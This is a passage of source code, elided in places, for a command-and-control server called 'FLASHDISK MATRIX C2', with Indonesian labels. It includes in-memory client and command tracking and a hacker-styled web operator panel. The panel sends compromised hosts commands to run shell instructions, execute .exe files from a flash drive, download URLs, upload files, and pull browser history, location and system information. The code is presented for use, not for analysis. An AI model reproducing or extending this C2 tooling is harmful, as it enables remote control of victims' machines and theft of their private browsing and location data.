...
# ========== PENYIMPANAN MEMORI (TANPA DATABASE) ==========
clients = {}          # hostname -> client data
commands = {}         # hostname -> list of commands
command_counter = 0
...
def get_pending_commands(hostname):
    ...
    for cmd in commands[hostname]:
        if cmd['status'] == 'pending':
            ...
            cmd['status'] = 'sent'   # mark as taken by client
    return pending
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; overflow-x: auto; }
        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
        .container { position: relative; z-index: 1; max-width: 1400px; margin: 0 auto; background: rgba(0,0,0,0.8); backdrop-filter: blur(2px); border: 1px solid #0f0; border-radius: 12px; padding: 20px; }
        h1, h2 { border-left: 3px solid #0f0; padding-left: 15px; margin: 15px 0; }
        .matrix-panel { background: #0a0f0a; border: 1px solid #0f0; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
        select, input, button { background: #111; border: 1px solid #0f0; color: #0f0; padding: 6px 10px; font-family: monospace; border-radius: 4px; }
        button:hover { background: #0f0; color: #000; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #0f0; padding: 6px; text-align: left; vertical-align: top; }
        th { background: #1a2a1a; }
        #map { height: 300px; border: 1px solid #0f0; border-radius: 8px; }
...
<div class="container">
    <h1>🧬 FLASHDISK MATRIX C2 (Memory Mode)</h1>
    ...
    <div id="clientInfo" style="display:none;">
        ...
        <div class="matrix-panel">
            ...
            <div style="display:flex; flex-wrap:wrap; gap:10px; margin-bottom:15px;">
                <button onclick="sendText()">📝 Pesan</button>
                <button onclick="sendRunCmd()">⚙️ Run CMD</button>
                <button onclick="sendExecExe()">🎯 Jalankan .exe</button>
                <button onclick="sendDownloadUrl()">📥 Download URL</button>
                <button onclick="showUploadForm()">📂 Upload File</button>
                <button onclick="sendGetBrowser()">🌐 History Browser</button>
                <button onclick="sendGetLocation()">📍 Lokasi Terbaru</button>
                <button onclick="sendGetSysInfo()">🔧 Info Sistem</button>
            </div>
...
<script>
    ...
    async function sendCommand(cmdType, cmdData) {
        ...
        if(res.ok) {
            ...
            document.getElementById('cmdResult').innerHTML = '❌ Gagal kirim';
        }
    }

    function sendText() { let msg = prompt('Pesan teks:'); if(msg) sendCommand('text', msg); }
    function sendRunCmd() { let cmd = prompt('Perintah CMD:'); if(cmd) sendCommand('run', cmd); }
    function sendExecExe() { let exe = prompt('Nama file .exe di flashdisk:'); if(exe) sendCommand('exec_exe', exe); }
    function sendDownloadUrl() { let url = prompt('URL file:'); if(url) sendCommand('download', url); }
    function showUploadForm() { document.getElementById('uploadForm').style.display = 'block'; }
    ...
    function sendGetBrowser() { sendCommand('get_browser_history', ''); }
    function sendGetLocation() { sendCommand('get_location', ''); }
    function sendGetSysInfo() { sendCommand('get_system_info', ''); }

    setInterval(() => { loadClientList(); if(currentHostname) loadCommandHistory(currentHostname); }, 15000);
    loadClientList();
</script>
</body>
</html>
...
def list_clients():
    return jsonify([{'hostname': h, 'ip': c.get('ip'), 'last_seen': c.get('last_seen')} for h, c in clients.items()])
